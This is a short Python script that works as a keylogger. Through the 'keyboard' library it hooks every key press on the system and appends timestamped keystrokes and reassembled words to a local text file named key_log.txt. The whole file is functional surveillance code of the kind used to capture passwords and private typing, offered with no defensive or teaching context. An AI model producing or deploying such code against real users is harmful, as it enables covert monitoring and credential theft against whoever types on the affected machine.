import keyboard
import datetime
import os

GIST_FILENAME = "key_log.txt"
current_word = []

# Function to log key presses and complete words
def log_key(e):
    global current_word
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if e.name in ['space', 'enter', 'tab', 'backspace']:
        if current_word:
            # Log the completed word
            with open(GIST_FILENAME, "a") as f:
                word = ''.join(current_word).strip()
                if word:
                    f.write(f"{current_time} - Word: {word}\n")
            current_word = []
        
        # Log special keys
        if e.name == 'space':
            with open(GIST_FILENAME, "a") as f:
                f.write(f"{current_time} - Key Press: SPACE\n")
        elif e.name == 'enter':
            with open(GIST_FILENAME, "a") as f:
                f.write(f"{current_time} - Key Press: ENTER\n")
        elif e.name == 'tab':
            with open(GIST_FILENAME, "a") as f:
                f.write(f"{current_time} - Key Press: TAB\n")
        elif e.name == 'backspace':
            # Log the backspace action
            with open(GIST_FILENAME, "a") as f:
                f.write(f"{current_time} - Key Press: BACKSPACE\n")
            if current_word:
                current_word.pop()  # Remove last character from the word

    elif len(e.name) == 1 and e.name.isalnum():
        # Log alphanumeric key presses and build words
        with open(GIST_FILENAME, "a") as f:
            f.write(f"{current_time} - Key Press: {e.name}\n")
        current_word.append(e.name)

# Listen for all key presses
keyboard.on_press(log_key)

# Keep the script running to capture key presses
keyboard.wait()
